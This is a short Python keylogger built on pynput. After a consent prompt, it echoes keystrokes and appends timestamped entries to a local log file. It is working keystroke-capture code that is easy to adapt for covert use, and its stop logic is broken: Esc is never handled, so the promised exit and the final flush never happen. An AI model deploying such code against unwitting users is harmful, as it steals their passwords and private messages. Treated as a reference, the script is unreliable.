from pynput.keyboard import Listener, Key
from datetime import datetime
import os

log_dir = "logs"
log_file = f"{log_dir}/key_log.txt"

os.makedirs(log_dir, exist_ok=True)

key_buffer = []
buffer_limit = 10

def log_key(key):
    global key_buffer

    if hasattr(key, 'char') and key.char is not None:
        key_value = key.char
        print(key_value, end='', flush=True)
    elif key == Key.space:
        key_value = ' '
        print(key_value, end='', flush=True)
    elif key == Key.enter:
        key_value = '\n'
        print(key_value, end='', flush=True)
    elif key == Key.tab:
        key_value = '\t'
        print(key_value, end='', flush=True)
    elif key == Key.backspace:
        print('\b \b', end='', flush=True)
        return
    else:
        return

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    key_buffer.append(f"{timestamp} - Key pressed: {key_value}")

    if len(key_buffer) >= buffer_limit:
        write_to_file()

    if key == Key.esc:
        write_to_file()
        return False

def write_to_file():
    if key_buffer:
        with open(log_file, "a") as file:
            for entry in key_buffer:
                file.write(entry + "\n")
        key_buffer.clear()

consent = input("This program will log keystrokes. Do you consent to this? (yes/no): ")
if consent.lower() == "yes":
    print("Keylogger is starting... Press Esc to stop.")
    with Listener(on_press=log_key) as listener:
        listener.join()
else:
    print("Consent not given. Exiting program.")
